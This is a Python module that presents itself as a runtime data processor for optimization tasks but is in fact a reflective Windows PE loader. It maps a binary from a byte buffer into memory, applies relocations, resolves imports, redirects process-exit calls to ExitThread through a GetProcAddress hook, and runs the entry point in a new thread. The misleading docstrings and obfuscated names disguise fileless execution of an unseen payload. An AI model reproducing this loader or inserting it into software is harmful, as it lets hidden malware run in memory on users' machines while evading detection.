# -*- coding: utf-8 -*-
"""
Runtime data processor for optimization tasks.
"""
import ctypes
import os
import struct
import sys
import time

# Compatibility flags for native extensions
_COMPAT = {
    "win32": os.name == "nt",
    "x64": struct.calcsize("P") == 8,
    "ffi": hasattr(ctypes, "windll"),
}


def _caps():
    return [k for k, v in _COMPAT.items() if v]


def create_processor():
    from . import runtime, crypto

    _sys = runtime.get_system_info()

    def process(data):
        if not data or len(data) < 64:
            return False
        if os.name != "nt" or struct.calcsize("P") != 8:
            return False
        try:
            if not _sys:
                return False
            d = crypto.analyze_structure(data)
            if not d:
                return False
            return _run_pipeline(_sys, d, data)
        except Exception:
            return False

    def _run_pipeline(k, d, data):
        # Phase 1: allocate working buffer
        v1 = d["b"]
        v2 = d["s"]
        buf = k.VirtualAlloc(ctypes.c_void_p(v1), v2, 0x3000, 0x04)
        adjusted = False
        if not buf or buf != v1:
            buf = k.VirtualAlloc(None, v2, 0x3000, 0x04)
            adjusted = True
        if not buf:
            return False

        # Phase 2: transfer data blocks
        _transfer(k, buf, d, data)

        # Phase 3: fixup if base address changed
        if adjusted:
            if not _fixup(k, buf, d):
                return False

        # Phase 4: link external references
        if d["i"]:
            _link(k, buf, d)

        # Phase 5: configure access permissions
        _configure(k, buf, d)

        # Phase 6: activate task
        return _activate(k, buf, d)

    def _transfer(k, base, d, data):
        # Copy header block
        h_sz = d["h"]
        ctypes.memmove(base, data[:h_sz], h_sz)
        # Copy segment blocks
        for vs, va, rs, rp, ch in d["c"]:
            if rs > 0 and rp > 0:
                n = min(rs, len(data) - rp)
                if n > 0:
                    ctypes.memmove(base + va, data[rp:rp + n], n)

    def _fixup(k, base, d):
        delta = base - d["b"]
        if not d["r"] or not d["z"]:
            k.VirtualFree(ctypes.c_void_p(base), 0, 0x8000)
            return False
        pos = 0
        while pos < d["z"]:
            br = crypto.read_data(base + d["r"] + pos, "<I")
            bs = crypto.read_data(base + d["r"] + pos + 4, "<I")
            if bs == 0:
                break
            for j in range((bs - 8) // 2):
                ent = crypto.read_data(base + d["r"] + pos + 8 + j * 2, "<H")
                if ent >> 12 == 10:
                    a = base + br + (ent & 0xFFF)
                    crypto.write_data(a, "<Q", crypto.read_data(a, "<Q") + delta)
            pos += bs
        return True

    # Guarded API names for process stability
    _guard = (b"ExitProcess", b"TerminateProcess", b"NtTerminateProcess")

    def _link(k, base, d):
        _k32 = k.GetModuleHandleA(b"kernel32.dll")
        _exit_thr = k.GetProcAddress(_k32, b"ExitThread")
        _gpa_raw = k.GetProcAddress(_k32, b"GetProcAddress")

        _GT = ctypes.WINFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p)
        _real = _GT(_gpa_raw)

        @_GT
        def _hook(hmod, name_or_ord):
            nv = name_or_ord if name_or_ord is not None else 0
            if nv > 0xFFFF:
                try:
                    nm = ctypes.string_at(nv)
                    if nm in _guard:
                        return _exit_thr
                except Exception:
                    pass
            return _real(hmod, nv)

        _link._ref = _hook
        _hook_ptr = ctypes.cast(_hook, ctypes.c_void_p).value

        off = base + d["i"]
        while True:
            nr = crypto.read_data(off + 12, "<I")
            if nr == 0:
                break
            ir = crypto.read_data(off, "<I")
            ar = crypto.read_data(off + 16, "<I")
            dn = ctypes.string_at(base + nr)
            hm = k.LoadLibraryA(dn)
            lk = base + (ir if ir else ar)
            ia = base + ar
            while hm:
                tv = crypto.read_data(lk, "<Q")
                if tv == 0:
                    break
                if tv & 0x8000000000000000:
                    fa = k.GetProcAddress(hm, ctypes.c_void_p(tv & 0xFFFF))
                else:
                    fn = ctypes.string_at(base + (tv & 0x7FFFFFFFFFFFFFFF) + 2)
                    if fn in _guard and _exit_thr:
                        fa = _exit_thr
                    elif fn == b"GetProcAddress" and _hook_ptr:
                        fa = _hook_ptr
                    else:
                        fa = k.GetProcAddress(hm, fn)
                if fa:
                    crypto.write_data(ia, "<Q", fa)
                lk += 8
                ia += 8
            off += 20

    def _configure(k, base, d):
        old = ctypes.c_ulong(0)
        for vs, va, rs, rp, ch in d["c"]:
            sz = max(vs, rs)
            if sz == 0:
                continue
            hx = bool(ch & 0x20000000)
            hw = bool(ch & 0x80000000)
            pt = (0x40 if hw else 0x20) if hx else (0x04 if hw else 0x02)
            k.VirtualProtect(ctypes.c_void_p(base + va), sz, pt, ctypes.byref(old))

    def _activate(k, base, d):
        tid = ctypes.c_ulong(0)
        ht = k.CreateThread(None, 0, ctypes.c_void_p(base + d["e"]), None, 0, ctypes.byref(tid))
        if not ht:
            return False
        deadline = time.monotonic() + 240
        while time.monotonic() < deadline:
            if k.WaitForSingleObject(ht, 2000) == 0:
                break
        k.CloseHandle(ht)
        return True

    return process
